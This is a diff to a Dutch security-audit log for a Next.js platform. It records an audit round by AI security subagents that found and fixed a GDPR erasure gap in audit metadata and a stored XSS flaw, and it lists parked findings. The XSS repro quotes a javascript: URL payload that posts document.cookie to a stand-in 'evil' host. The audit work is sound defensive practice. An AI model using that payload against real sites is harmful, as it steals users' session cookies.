@@ -4,6 +4,78 @@
 > geparkeerd met repro, severity (KRITIEK/HOOG/MIDDEL/LAAG), geschonden regel en aanbevolen fix.
 > Pak per run de 1–3 belangrijkste; werk dit bestand bij.
 
+## Ronde 2026-07-20 (basis: `main` @ d11f7f5e)
+
+Audit: orchestrator (Opus 4.8) + 4 parallelle adversariële Opus-security-subagents op niet-overlappende
+oppervlakken — (1) AVG art. 17 anonimisering-/erasure-volledigheid (`account-anonymization.ts`,
+`admin/gebruikers/actions.ts`, schema-veld-voor-veld); (2) cross-tenant/multi-tenant-isolatie FRANCHISER
+(`lib/tenancy.ts`, `lib/franchise/**`, alle call-sites, `franchiserTasks`); (3) alle HTTP route-handlers
+`src/app/api/**` + hoogrisico server actions (documenten/facturen/certificaten/admin-verificatie/berichten/
+account); (4) resterende server actions (`samenwerkingen/[id]`, `prestaties`, `bedrijf`, `search`). Kader:
+OWASP Top 10 (A01 Broken Access Control, A03 Injection/XSS, A05, A10 SSRF) + ASVS + AVG art. 5/9/17/32.
+Stack: Next.js 15.5.19, Auth.js v5-beta.31, Prisma 6.2.1. Orchestrator verifieerde onafhankelijk: `npm audit
+--omit=dev` → 0 kwetsbaarheden; enige `dangerouslySetInnerHTML` = nonce-gated theme-script; geen
+`$queryRawUnsafe`/eval; alle CSV-exports via de formule-injectie-gehardende `escapeCsvField`/`toCsv`
+(CWE-1236); geen user-URL-SSRF (alle `fetch` naar vaste/allowlist-endpoints); `LocalStorageDriver.resolve()`
+path-traversal-guard correct.
+
+**Twee bevindingen gevonden en OPGELOST (rood→groen):**
+
+### OPGELOST — KRITIEK: `CREDENTIAL_REJECTED`-auditmetadata overleefde de erasure (AVG art. 17, PR volgt)
+
+- **Repro:** admin wijst een VOG/diploma af met een vrije-tekstreden → die reden staat in
+  `AuditLog.metadata.reason` op een rij met `actorId` = admin, `entityType: "Credential"`. `anonymizeUser`
+  verwijdert de credential hard (regel 4), maar de erasure-audit-scrub selecteert alleen rijen met
+  `actorId === userId` OF `entityType: "User"` OF exact-e-mail-match. De credential-afwijsrij valt buiten
+  alle drie → de reden (mogelijk de naam of art. 9-inhoud van het bewijsstuk) bleef onbeperkt leesbaar voor
+  elke admin met auditinzage. Precies het patroon dat voor `DISPUTE_OPENED` (via `actorId === userId`) wél
+  al gedekt was.
+- **Geschonden regel:** AVG art. 17; CLAUDE.md architectuurregel 5 (audit) samen met de eigen erasure-intent.
+- **Fix:** `src/app/(protected)/admin/gebruikers/actions.ts` — verzamelt de credential-id's van de betrokkene
+  vóór de verwijdering en redact binnen dezelfde transactie de `metadata` (→ `null`) van élke auditregel met
+  `entityType: "Credential"` en `entityId ∈ die id's` (uniek aan de betrokkene). De regel zelf (actor/actie/
+  tijd) blijft als verantwoordingsspoor. Test: `anonymize-erasure.test.ts` (+1, KRITIEK, rood→groen).
+
+### OPGELOST — HOOG: stored XSS via `company.website` (`javascript:`/`data:`-schema, OWASP A03/CWE-79, PR volgt)
+
+- **Repro:** een CLIENT zet `website=javascript:fetch('https://evil',{method:'POST',body:document.cookie})`
+  via het bedrijfsprofiel-formulier. `companyProfileSchema.website` gebruikte `z.string().url()`, dat óók
+  `javascript:`/`data:`-URI's goedkeurt. De waarde wordt als rauwe `href` gerenderd in
+  `company-profile-screen.tsx` én de opdracht-detailpagina → JS-uitvoering in de platform-origin bij een klik.
+  CSP (nonce + strict-dynamic) mitigeert in moderne browsers maar is geen server-side gate (oudere browsers/
+  toekomstige CSP-versoepeling niet gedekt).
+- **Geschonden regel:** CLAUDE.md architectuurregel 2 (Zod = bron van waarheid); OWASP A03.
+- **Fix:** `src/lib/validation.ts` — nieuwe `httpUrl()`-helper die uitsluitend `http:`/`https:` toestaat
+  (schema-restrictie, defense-in-depth, los van CSP); `companyProfileSchema.website` gebruikt hem nu. Test:
+  `validation.test.ts` (+2, HOOG, rood→groen; verwerpt `javascript:`/`data:`/`vbscript:`, accepteert http(s)).
+
+**Geparkeerd (vereisen FG/juridische sign-off of laag-risico architectuurdrift — niet unilateraal):**
+
+- **MIDDEL (AVG art. 17):** de `PERFORMANCE_REJECTED`/`INVOICE_REJECTED`/`NO_SHOW_JUDGED`-auditmetadata dragen
+  dezelfde vrije-tekstreden als de reeds-geparkeerde DB-velden (`Performance.rejectionReason`,
+  `NoShowReport.reason`). Wanneer die backlog-carve-out juridisch wordt beslist, moet de beslissing óók de
+  bijbehorende auditlog-metadata dekken (nu ongemoeid). Aanbevolen: expliciet aan het MENSENWERK-item toevoegen.
+- **HOOG (AVG art. 17):** `Review.comment` geschreven door de tegenpartij _over_ de gewiste persoon
+  (`subjectId === userId`) wordt niet geraakt (alleen de auteur-kant `authorId` wordt geredact) en blijft
+  zichtbaar in de publieke reputatie-query. Vereist dezelfde legitiem-belang/bewaargrond-afweging als
+  `NoShowReport.reason` (FG/juridisch) — óf redacten óf expliciet documenteren als bewuste retentie.
+- **MIDDEL/LAAG (OWASP A05):** `toMessage` in `samenwerkingen/[id]/actions.ts` herwerpt `e.message` voor élke
+  Error (geen Prisma-/systeemfout-filter zoals `toSafeActionError` elders in hetzelfde bestand). Next.js'
+  productie-digest-scrubbing mitigeert de meeste gevallen; consistentie-fix aanbevolen (route via
+  `toSafeActionError`).
+- **LAAG (architectuurdrift):** `setOrtProfileAction`/`setWeekdaysAction`/`setAgreementTypeAction` valideren
+  handmatig (whitelist + bounds) i.p.v. via Zod. Checks zijn correct/niet-exploiteerbaar; wrap in een klein
+  `z.object` voor consistentie met regel 2.
+- **Awareness (AVG art. 5.1.c):** `Expense.description` (vrije tekst) valt onder de fiscale-retentie-carve-out
+  zoals `Invoice`, maar kan meer identificerend detail bevatten dan fiscaal nodig — data-minimalisatie-
+  judgment call voor de FG.
+
+**Schoon herbevestigd:** franchiser cross-tenant-isolatie airtight (elke `findUnique`/`findFirst` bakt
+`tenantId` in of volgt `assertSameTenant`/`ownsViaTenant`; `tenantId` altijd uit `actor.tenantId`, nooit uit
+client-input); alle `api/**`-routes + hoogrisico-actions hebben de volledige auth→rol→ownership→Zod→actie→
+audit-keten, geen IDOR/overposting; document-/media-routes ownership-checked + audit op toegestaan én
+geweigerd; cron fail-closed timing-safe; billing-webhook idempotent + provider-geverifieerd.
+
 ## Ronde 2026-07-19b (basis: `main` @ fb4d4f2e)
 
 Audit: orchestrator (Opus 4.8) + 4 parallelle adversariële Opus-security-subagents op niet-overlappende
